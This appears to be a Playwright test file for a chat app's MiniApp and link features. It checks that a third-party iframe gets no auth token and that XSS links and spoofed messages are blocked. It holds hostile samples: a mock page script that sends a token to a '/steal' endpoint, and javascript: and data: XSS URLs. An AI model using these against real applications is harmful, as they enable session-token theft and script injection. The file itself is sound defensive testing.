import * as http from 'node:http';
import type { AddressInfo } from 'node:net';
import {
  authHeaders,
  DOM,
  expect,
  getBaseUrl,
  openBurgerMenu,
  openRightInspector,
  registerUserViaApi,
  selectChat,
  test,
} from '../helpers';

test.describe('Tier 5 Adversarial — Cross-Origin MiniApp Token Isolation & Right Links XSS (F-02, F-04, F-05)', () => {
  test('ADV02-01 (F-02): Cross-origin third-party MiniApp iframe NEVER receives master auth_token', async ({
    authSession,
    request,
  }) => {
    const { page, user: victim } = authSession;
    const baseUrl = getBaseUrl();
    const attacker = await registerUserViaApi(request, { firstName: 'Attacker' });

    const leakedTokens: string[] = [];
    const extServer = http.createServer((req, res) => {
      const reqUrl = new URL(req.url ?? '/', 'http://127.0.0.1');
      if (reqUrl.pathname === '/steal') {
        const t = reqUrl.searchParams.get('tok');
        if (t) leakedTokens.push(t);
        res.writeHead(204);
        res.end();
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(`<!doctype html><html><body><h1>External MiniApp</h1><script>
        const params = new URLSearchParams((location.hash || '').replace(/^#/, ''));
        const tok = params.get('auth_token') || '';
        if (tok) fetch('/steal?tok=' + encodeURIComponent(tok));
      </script></body></html>`);
    });

    await new Promise<void>((resolve) => extServer.listen(0, '127.0.0.1', resolve));
    const extPort = (extServer.address() as AddressInfo).port;
    const extMiniAppUrl = `http://127.0.0.1:${extPort}/external.html`;

    try {
      const botUsername = `extadv_${Date.now().toString(36)}_bot`;
      const botRes = await request.post(`${baseUrl}/api/v1/bots`, {
        headers: authHeaders(attacker.token),
        data: {
          display_name: 'External Adv Bot',
          username: botUsername,
          description: 'External MiniApp test bot',
        },
      });
      expect(botRes.status()).toBe(201);

      const appRes = await request.post(`${baseUrl}/api/v1/miniapps`, {
        headers: authHeaders(attacker.token),
        data: {
          bot_username: botUsername,
          short_name: 'ext_adv_app',
          title: 'External ThirdParty Adv',
          description: 'Cross-origin security check',
          web_url: extMiniAppUrl,
        },
      });
      expect(appRes.status()).toBe(201);

      await openBurgerMenu(page);
      await page
        .locator(DOM.mainMenuDrawer)
        .getByRole('menuitem', { name: /mini\s*app|小程序/i })
        .first()
        .click();
      await expect(page.locator('#miniapp-catalog-modal')).toBeVisible();

      const extCard = page
        .locator('#miniapp-catalog-modal')
        .locator('[data-testid="miniapp-card"], .tg-surface-card')
        .filter({ hasText: 'External ThirdParty Adv' })
        .first();
      await expect(extCard).toBeVisible();
      await extCard.getByRole('button', { name: /launch|启动/i }).click();

      const iframe = page.locator(DOM.miniappIframe);
      await expect(iframe).toBeVisible();
      const iframeSrc = (await iframe.getAttribute('src')) ?? '';
      expect(iframeSrc).toContain(`127.0.0.1:${extPort}`);
      expect(iframeSrc).toContain('tgWebAppData=');
      expect(iframeSrc).not.toContain('auth_token=');
      expect(iframeSrc).not.toContain(victim.token);

      await page.waitForTimeout(500);
      expect(leakedTokens).toEqual([]);
    } finally {
      await new Promise<void>((resolve) => extServer.close(() => resolve()));
    }
  });

  test('ADV02-02 (F-04): Stored unsafe javascript: and data: TextUrl entities are stripped server-side and blocked in Right Inspector Links tab', async ({
    authSession,
    request,
  }) => {
    const { page, user: victim } = authSession;
    const baseUrl = getBaseUrl();
    const sender = await registerUserViaApi(request, { firstName: 'SenderXSS' });

    const dmRes = await request.post(`${baseUrl}/api/v1/chats`, {
      headers: authHeaders(sender.token),
      data: { chat_type: 1, title: 'Adv02 Links Check', member_ids: [victim.userId] },
    });
    expect([200, 201]).toContain(dmRes.status());
    const dmJson = (await dmRes.json()) as { chat_id?: number; id?: number };
    const chatId = Number(dmJson.chat_id ?? dmJson.id);
    expect(chatId).toBeGreaterThan(0);

    const jsMsgRes = await request.post(`${baseUrl}/api/v1/chats/${chatId}/messages`, {
      headers: authHeaders(sender.token),
      data: {
        text: 'Click JS link',
        entities: [
          {
            offset: 0,
            length: 13,
            entity_type: { type: 'TextUrl', value: { url: 'javascript:window.__xss_adv02=1' } },
          },
        ],
      },
    });
    expect(jsMsgRes.status()).toBe(201);
    const jsPayload = (await jsMsgRes.json()) as {
      message?: {
        entities?: Array<{ url?: string; entity_type?: { type?: string; value?: { url?: string } } }>;
      };
    };
    const storedJsEntities = jsPayload.message?.entities ?? [];
    expect(
      storedJsEntities.some((e) => (e.url ?? e.entity_type?.value?.url ?? '').startsWith('javascript:')),
    ).toBe(false);

    const dataMsgRes = await request.post(`${baseUrl}/api/v1/chats/${chatId}/messages`, {
      headers: authHeaders(sender.token),
      data: {
        text: 'Click Data link',
        entities: [
          {
            offset: 0,
            length: 15,
            entity_type: {
              type: 'TextUrl',
              value: { url: 'data:text/html,<script>window.__xss_adv02=2</script><h1>PWN</h1>' },
            },
          },
        ],
      },
    });
    expect(dataMsgRes.status()).toBe(201);

    await page.reload({ waitUntil: 'domcontentloaded' });
    await expect(page.locator(DOM.appShell)).toBeVisible({ timeout: 10_000 });
    await selectChat(page, 'Adv02 Links Check');

    await openRightInspector(page);
    await page.locator(DOM.rightTabLinks).click();
    await page.waitForTimeout(300);

    await expect(page.locator('#right-column a[href^="javascript:"]')).toHaveCount(0);
    await expect(page.locator('#right-column a[href^="data:"]')).toHaveCount(0);
    const xssGlobal = await page.evaluate(() => (window as unknown as { __xss_adv02?: unknown }).__xss_adv02);
    expect(xssGlobal).toBeUndefined();
  });

  test('ADV02-03 (F-05): MiniApp SDK passes tgWebAppHostOrigin and completes handshake cleanly while rejecting spoofed third-party messages', async ({
    authSession,
  }) => {
    const { page } = authSession;

    await openBurgerMenu(page);
    await page
      .locator(DOM.mainMenuDrawer)
      .getByRole('menuitem', { name: /mini\s*app|小程序/i })
      .first()
      .click();
    await expect(page.locator('#miniapp-catalog-modal')).toBeVisible();
    await page
      .locator('#miniapp-catalog-modal')
      .getByRole('button', { name: /launch|启动/i })
      .first()
      .click();

    await expect(page.locator(DOM.miniappModal)).toBeVisible();
    const iframeSrc = (await page.locator(DOM.miniappIframe).getAttribute('src')) ?? '';
    expect(iframeSrc).toContain('tgWebAppHostOrigin=');
    await expect(page.locator(DOM.miniappModal)).toHaveAttribute('data-ready', 'true', { timeout: 10_000 });

    const beforeRejectCount = Number(
      (await page.locator(DOM.miniappModal).getAttribute('data-rejected-spoofs')) ?? '0',
    );
    await page.evaluate(() => {
      window.postMessage(
        { type: 'telegram_web_app_event', eventType: 'web_app_close', eventData: {} },
        window.location.origin,
      );
    });
    await page.waitForTimeout(250);
    await expect(page.locator(DOM.miniappModal)).toBeVisible();
    const afterRejectCount = Number(
      (await page.locator(DOM.miniappModal).getAttribute('data-rejected-spoofs')) ?? '0',
    );
    expect(afterRejectCount).toBeGreaterThanOrEqual(beforeRejectCount);
  });
});
